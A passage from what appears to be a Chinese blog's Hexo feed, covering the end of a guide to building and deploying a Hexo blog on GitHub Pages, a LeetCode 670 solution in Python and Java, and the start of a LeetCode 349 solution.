themes/next<br></code></pre></td></tr></table></figure><p>然后修改<code>_config.yml</code>文件中的<code>theme</code>为主题名字：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">theme:</span> <span class="hljs-keyword">next</span><br></code></pre></td></tr></table></figure><p>然后重新生成和运行：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><p>这样就可以看到修改后的主题了，这样就好看多了。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/7kon5wcfli.png" alt="img"></p><p>还有另外的一种修改主题的方法，使用的主题是<a href="https://github.com/fluid-dev/hexo-theme-fluid">fluid</a>，其他主题不知道是否提供这种方法，在<code>Hexo 5.0.0</code>版本以上，推荐通过<code>npm</code>直接安装，进入博客目录执行命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure><p>这样会将主题下载到<code>node_modules</code>目录下的<code>hexo-theme-fluid</code>文件夹中，然后将该文件夹中的<code>_config.yml</code>复制到博客根目录的<code>_config.fluid.yml</code>文件中。接着修改根目录的<code>_config.yml</code>文件指定主题。最后重新生成和运行，就可以看到效果了：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003091327142.png" alt="image-20221003091327142"></p><h2 id="部署到Github-Page"><a href="#部署到Github-Page" class="headerlink" title="部署到Github Page"></a>部署到<code>Github Page</code></h2><p>前面已经设置好了个人<code>blog</code>，但是只能自己看，接下啦就部署到网上让更多人看到了。如果有自己的服务器可以部署到服务器上，如果没有，就可以部署到<code>Github Page</code>上。</p><p>首先创建<code>Github</code>账号，创建一个仓库<code>&lt;Github name&gt;.github.io</code>，属性为<code>public</code>。</p><p>然后在本地安装<code>hexo-deployer-git</code>插件，用于<code>push</code>到<code>GitHub</code>上：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>在<code>_config.yml</code>中配置Git：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">deploy:<br>    type: git<br>    repo: https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/&lt;Github name&gt;/</span>&lt;Github name&gt;.github.io<br></code></pre></td></tr></table></figure><p>接着就可以部署到Github了：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure><p>这里<code>d</code>就是<code>deploy</code>，即部署。默认会推送到<code>master</code>分支。推送可以使用<code>hexo g -d</code>或者<code>hexo d -g</code>来完成自动生成和部署。</p><p>现在访问<code>&lt;Github name&gt;.github.io</code>就可以访问了。</p><h2 id="如何写作"><a href="#如何写作" class="headerlink" title="如何写作"></a>如何写作</h2><p>网站创建就完成了，接下来就是如何能创建和管理内容了，毕竟内容才是最主要的。</p><p>创建新文章有两种方法，可以使用命令创建，在根目录下使用命令：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">hexo new <span class="hljs-selector-tag">article</span> &lt;<span class="hljs-selector-tag">Article</span> name&gt;<br></code></pre></td></tr></table></figure><p>就会在<code>source/_posts</code>下生成相应的MD文件了。或者可以直接在该目录下创建文件，个人更喜欢后者。</p><p>这里不得不说一下图片的处理，Markdown文档的图片是以URL形式设置的，所以需要一个稳定的地址来保存图片，通常需要用到图床，但是网上的免费图床可能会失效，这就很难受了。所以就自建了图床，用到了<code>picGo</code>、<code>Typora</code>和<code>腾讯云COS</code>，将会在另一篇文章细说。</p><h3 id="文章管理"><a href="#文章管理" class="headerlink" title="文章管理"></a>文章管理</h3><p>可以给文章打标签、分类或者设置其他属性，用于管理。</p><p>这里也可以使用命令，但是用起来有点麻烦，这里使用更直观的方法。每次创建文件时，都在文章开头设置属性：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">文章名称</span><br><span class="hljs-attr">layout:</span> <span class="hljs-string">layout</span><br><span class="hljs-attr">tags:</span> <br>    <span class="hljs-bullet">-</span> <span class="hljs-string">tag1</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">tag2</span><br><span class="hljs-attr">categories:</span> <br>    <span class="hljs-bullet">-</span> [<span class="hljs-string">categories1</span>]<br>    <span class="hljs-bullet">-</span> [<span class="hljs-string">categories2</span>]<br><span class="hljs-attr">date:</span> <span class="hljs-number">2022-10-02</span><br><span class="hljs-attr">updated:</span> <span class="hljs-number">2022-10-03</span><br><span class="hljs-attr">comments:</span> <span class="hljs-literal">true</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>其中关键字的表示：</p><ul><li><code>title</code>：文章标题。</li><li><code>layout</code>：布局。指定文章的布局。</li><li><code>tags</code>：标签。</li><li><code>categories</code>：分类。为什么需要加方括号参考<a href="https://hexo.io/zh-cn/docs/front-matter">这里</a>。</li><li><code>date</code>：创建日期。</li><li><code>updated</code>：更新日期。</li><li><code>comments</code>：是否开启评论功能，默认true。</li></ul><p>还有一些其他的关键字看：<a href="https://hexo.io/zh-cn/docs/front-matter">Front-matter | Hexo</a>。</p><h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><p>使用网站搭建好了，但是网站名有点长，不好记，所以可以买个合适的域名绑定。</p><p>购买域名推荐<a href="https://www.dynadot.com/">Dynadot</a>，国外的域名商，可以使用支付宝购买，而且不用<strong>备案</strong>。</p><p>申请账号后，就可以选域名了，注意要在这里选择<strong>人民币</strong>，否则不能用支付宝支付：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003100506139.png" alt="image-20221003100506139"></p><p>在博客的<code>sources</code>目录下新建<code>CNAME</code>文件，在文件中写申请的域名，然后推到<code>Github</code>上。</p><p>接着需要为域名添加<code>DNS</code>解析，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003101234645.png" alt="image-20221003101234645"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003101330991.png" alt="image-20221003101330991"></p><p>最后在<code>Github</code>仓库中点击<code>setting</code>，进行设置：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221003101504745.png" alt="image-20221003101504745"></p><p>等一会，就可以使用自己的域名访问了！</p><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><p><code>Github</code>不让百度爬取索引，所以百度是搜索不到网站的。如果想要被更多的搜索，就可以购买自己的服务器了。</p><p>腾讯或者阿里的都可以，第一次购买有优惠，还有学生优惠，偶尔还会打折，价格也不贵，但是需要备案。服务器搭建服务这里就不多说了，教程很多。搭建好网站后记得<code>DNS</code>解析到服务器。</p><h2 id="Hexo的一些命令"><a href="#Hexo的一些命令" class="headerlink" title="Hexo的一些命令"></a><code>Hexo</code>的一些命令</h2><p>这里介绍一些常用的命令，可以跳过。</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a><code>init</code></h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hexo</span> init<span class="hljs-meta"> [folder]</span><br></code></pre></td></tr></table></figure><p>新建一个网站。如果没有设置 <code>folder</code> ，<code>Hexo</code> 默认在目前的文件夹建立网站。</p><p>本命令相当于执行了以下几步：</p><ol><li><code>Git clone hexo-starter</code> 和 <code>hexo-theme-landscape</code> 主题到当前目录或指定目录。</li><li>使用 <code>Yarn 1</code>、<code>pnpm</code> 或 <code>npm</code> 包管理器下载依赖（如有已安装多个，则列在前面的优先）。<code>npm</code> 默认随 <code>Node.js</code> 安装。</li></ol><h3 id="new"><a href="#new" class="headerlink" title="new"></a><code>new</code></h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">hexo <span class="hljs-keyword">new</span> [layout] &lt;<span class="hljs-built_in">title</span>&gt;<br></code></pre></td></tr></table></figure><p>新建一篇文章。如果没有设置 <code>layout</code> 的话，默认使用 <a href="https://hexo.io/zh-cn/docs/configuration">_config.yml</a> 中的 <code>default_layout</code> 参数代替。如果标题包含空格的话，请使用引号括起来。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">$ hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;post title with whitespace&quot;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>-p</code>, <code>--path</code></td><td align="left">自定义新文章的路径</td></tr><tr><td align="left"><code>-r</code>, <code>--replace</code></td><td align="left">如果存在同名文章，将其替换</td></tr><tr><td align="left"><code>-s</code>, <code>--slug</code></td><td align="left">文章的 Slug，作为新文章的文件名和发布后的 URL</td></tr></tbody></table><p>默认情况下，<code>Hexo</code> 会使用文章的标题来决定文章文件的路径。对于独立页面来说，<code>Hexo</code> 会创建一个以标题为名字的目录，并在目录中放置一个 <code>index.md</code> 文件。你可以使用 <code>--path</code> 参数来覆盖上述行为、自行决定文件的目录：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> --path about/me <span class="hljs-string">&quot;About me&quot;</span><br></code></pre></td></tr></table></figure><p>以上命令会创建一个 <code>source/about/me.md</code> 文件，同时 <code>Front Matter</code> 中的 <code>title</code> 为 <code>&quot;About me&quot;</code></p><p>注意！<code>title</code> 是必须指定的！如果你这么做并不能达到你的目的：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">hexo <span class="hljs-keyword">new</span> page <span class="hljs-comment">--path about/me</span><br></code></pre></td></tr></table></figure><p>此时 <code>Hexo</code> 会创建 <code>source/_posts/about/me.md</code>，同时 <code>me.md</code> 的 <code>Front Matter</code> 中的 <code>title</code> 为 <code>&quot;page&quot;</code>。这是因为在上述命令中，<code>hexo-cli</code> 将 <code>page</code> 视为指定文章的标题、并采用默认的 <code>layout</code>。</p><h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">$ hexo <span class="hljs-keyword">generate</span><br></code></pre></td></tr></table></figure><p>生成静态文件。</p><table><thead><tr><th align="left">选项</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>-d</code>, <code>--deploy</code></td><td align="left">文件生成后立即部署网站</td></tr><tr><td align="left"><code>-w</code>, <code>--watch</code></td><td align="left">监视文件变动</td></tr><tr><td align="left"><code>-b</code>, <code>--bail</code></td><td align="left">生成过程中如果发生任何未处理的异常则抛出异常</td></tr><tr><td align="left"><code>-f</code>, <code>--force</code></td><td align="left">强制重新生成文件 Hexo 引入了差分机制，如果 <code>public</code> 目录存在，那么 <code>hexo g</code> 只会重新生成改动的文件。 使用该参数的效果接近 <code>hexo clean &amp;&amp; hexo generate</code></td></tr><tr><td align="left"><code>-c</code>, <code>--concurrency</code></td><td align="left">最大同时生成文件的数量，默认无限制</td></tr></tbody></table><p>该命令可以简写为</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>hexo g<br></code></pre></td></tr></table></figure><h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">$ hexo publish [layout] <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发表草稿。</p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">$ hexo <span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p><table><thead><tr><th align="left">选项</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>-p</code>, <code>--port</code></td><td align="left">重设端口</td></tr><tr><td align="left"><code>-s</code>, <code>--static</code></td><td align="left">只使用静态文件</td></tr><tr><td align="left"><code>-l</code>, <code>--log</code></td><td align="left">启动日记记录，使用覆盖记录格式</td></tr></tbody></table><h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>hexo deploy<br></code></pre></td></tr></table></figure><p>部署网站。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>-g</code>, <code>--generate</code></td><td align="left">部署之前预先生成静态文件</td></tr></tbody></table><p>该命令可以简写为：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>hexo d<br></code></pre></td></tr></table></figure><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">$ hexo render &lt;file1&gt; [file2] ...<br></code></pre></td></tr></table></figure><p>渲染文件。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>-o</code>, <code>--output</code></td><td align="left">设置输出路径</td></tr></tbody></table><h3 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>hexo migrate &lt;<span class="hljs-keyword">type</span>&gt;<br></code></pre></td></tr></table></figure><p>从其他博客系统 <a href="https://hexo.io/zh-cn/docs/migration">迁移内容</a>。</p><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>hexo clean<br></code></pre></td></tr></table></figure><p>清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)。</p><p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>hexo list &lt;<span class="hljs-keyword">type</span>&gt;<br></code></pre></td></tr></table></figure><p>列出网站资料。</p><h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ hexo <span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><p>显示 <code>Hexo</code> 版本。</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>github</tag>
      
      <tag>域名</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[算法] LeetCode-670-最大交换</title>
    <link href="/2022/10/02/%5B%E7%AE%97%E6%B3%95%5D%20LeetCode-670-%E6%9C%80%E5%A4%A7%E4%BA%A4%E6%8D%A2/"/>
    <url>/2022/10/02/%5B%E7%AE%97%E6%B3%95%5D%20LeetCode-670-%E6%9C%80%E5%A4%A7%E4%BA%A4%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="670-最大交换"><a href="#670-最大交换" class="headerlink" title="670-最大交换"></a>670-最大交换</h1><p>给定一个非负整数，你<strong>至多</strong>可以交换一次数字中的任意两位。返回你能得到的<strong>最大值</strong>。</p><p><strong>示例 1 :</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">输入: 2736</span><br><span class="hljs-section">输出: 7236</span><br><span class="hljs-section">解释: 交换数字2和数字7。</span><br></code></pre></td></tr></table></figure><p><strong>示例 2 :</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">输入: 9973</span><br><span class="hljs-section">输出: 9973</span><br><span class="hljs-section">解释: 不需要交换。</span><br></code></pre></td></tr></table></figure><p><strong>注意:</strong></p><ol><li>给定数字的范围是 <code>[0, 10^8]</code></li></ol><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>既然要得到最大值，那么就尽量把最大值放到前面。如何交换？需要将数字从大到小排列，然后依次将原来的数字与排列好的数字比较，如果相等就比较下一个；如果原来的数字小，那么就把这个数设置为相比较的那个大数，然后在原来的数字从后向前寻找替换的大数，找到后将其设置为小数。</p><p>为什么第二次要从后向前的查找？是为了尽量得到更大的数。如果前面或中间的大数被替换了，得到的不是最大的数。</p><p>python实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">maximumSwap</span>(<span class="hljs-params">self, num: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        ts = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">str</span>(num))<br>        tmp = <span class="hljs-built_in">sorted</span>(ts, reverse=<span class="hljs-literal">True</span>)<br>        c = <span class="hljs-number">0</span><br>        k = -<span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ts)):<br>            <span class="hljs-keyword">if</span> ts[i] == tmp[c]:<br>                c += <span class="hljs-number">1</span><br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">elif</span> ts[i] &lt; tmp[c]:<br>                k = ts[i]<br>                ts[i] = tmp[c]<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> k != -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ts)-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>                <span class="hljs-keyword">if</span> ts[i] == tmp[c]:<br>                    ts[i] = k<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join(ts))<br><br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">执行用时：<span class="hljs-number">36</span> ms, 在所有 Pytho<span class="hljs-symbol">n3</span> 提交中击败了<span class="hljs-number">68.71</span><span class="hljs-meta">%</span>的用户<br>内存消耗：<span class="hljs-number">14.9</span> MB, 在所有 Pytho<span class="hljs-symbol">n3</span> 提交中击败了<span class="hljs-number">42.18</span><span class="hljs-meta">%</span>的用户<br>通过测试用例：<span class="hljs-number">111</span> / <span class="hljs-number">111</span><br></code></pre></td></tr></table></figure><hr><hr><p>Java的解法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">maximumSwap</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> &#123;<br>        <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">char</span>[] chars = String.valueOf(num).toCharArray();<br>        <span class="hljs-type">int</span>[] maxIndex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[chars.length];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> chars.length-<span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> chars.length-<span class="hljs-number">1</span>; j &gt;= <span class="hljs-number">0</span>; j--)&#123;<br>            <span class="hljs-keyword">if</span> (chars[j] - <span class="hljs-string">&#x27;0&#x27;</span> &gt; chars[max] - <span class="hljs-string">&#x27;0&#x27;</span>)&#123;<br>                max = j;<br>            &#125;<br>            maxIndex[j] = max;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; chars.length; i++)&#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">iValue</span> <span class="hljs-operator">=</span> chars[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">maxValue</span> <span class="hljs-operator">=</span> chars[maxIndex[i]] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (maxValue != iValue)&#123;<br>                chars[i] = (<span class="hljs-type">char</span>) (maxValue + <span class="hljs-string">&#x27;0&#x27;</span>);<br>                chars[maxIndex[i]] = (<span class="hljs-type">char</span>) (iValue + <span class="hljs-string">&#x27;0&#x27;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> Integer.parseInt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(chars));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">执行用时：<span class="hljs-number">0</span> ms, 在所有 Java 提交中击败了<span class="hljs-number">100.00</span><span class="hljs-comment">%的用户</span><br>内存消耗：<span class="hljs-number">38.1</span> MB, 在所有 Java 提交中击败了<span class="hljs-number">86.13</span><span class="hljs-comment">%的用户</span><br>通过测试用例：<span class="hljs-number">111</span> / <span class="hljs-number">111</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
      <category>技能</category>
      
    </categories>
    
    
    <tags>
      
      <tag>leetcode</tag>
      
      <tag>python</tag>
      
      <tag>java</tag>
      
      <tag>数组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[算法] LeetCode-349-两个数组的交集</title>
    <link href="/2022/10/01/%5B%E7%AE%97%E6%B3%95%5D%20LeetCode-349-%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/"/>
    <url>/2022/10/01/%5B%E7%AE%97%E6%B3%95%5D%20LeetCode-349-%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="349-两个数组的交集"><a href="#349-两个数组的交集" class="headerlink" title="349-两个数组的交集"></a>349-两个数组的交集</h1><p>给定两个数组 <code>nums1</code> 和 <code>nums2</code> ，返回 <em>它们的交集</em> 。输出结果中的每个元素一定是 <strong>唯一</strong> 的。我们可以 <strong>不考虑输出结果的顺序</strong> 。</p><p>示例 1：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">输入：nums1 = <span class="hljs-comment">[1,2,2,1]</span>, nums2 = <span class="hljs-comment">[2,2]</span><br>输出：<span class="hljs-comment">[2]</span><br></code></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">输入：nums1 = <span class="hljs-comment">[4,9,5]</span>, nums2 = <span class="hljs-comment">[9,4,9,8,4]</span><br>输出：<span class="hljs-comment">[9,4]</span><br>解释：<span class="hljs-comment">[4,9]</span> 也是可通过的<br></code></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= nums1.length, nums2.length &lt;= 1000</code></li><li><code>0 &lt;= nums1[i], nums2[i] &lt;= 1000</code></li></ul><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>求两个数组的交集，在python中可以使用set进行去重，然后求合集，但是这种方法算是“作弊”吧😅</p><p>另一种方法是对其中一个数组进行遍历，判断其中元素是否在另一个数组中，但是想一想这种方法的复杂度有点高；时间复杂度来说，对于每个元素，都需要在另一个数组中判断是否存在，所以复杂度为<code>O(m*n)</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">intersection</span>(<span class="hljs-params">self, nums1: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>], nums2: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:<br>        res = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nums1:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> nums2:<br>                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res:<br>                    res.append(i)<br>        <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure><p>最后运行结果为</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">执行用时：<span class="hljs-number">52</span> ms, 在所有 Pytho<span class="hljs-symbol">n3</span> 提交中击败了<span class="hljs-number">16.16</span><span class="hljs-meta">%</span>的用户<br>内存消耗：<span class="hljs-number">15</span> MB, 在所有 Pytho<span class="hljs-symbol">n3</span> 提交中击败了<span class="hljs-number">75.52</span><span class="hljs-meta">%</span>的用户<br>通过测试用例：<span class="hljs-number">55</span> / <span 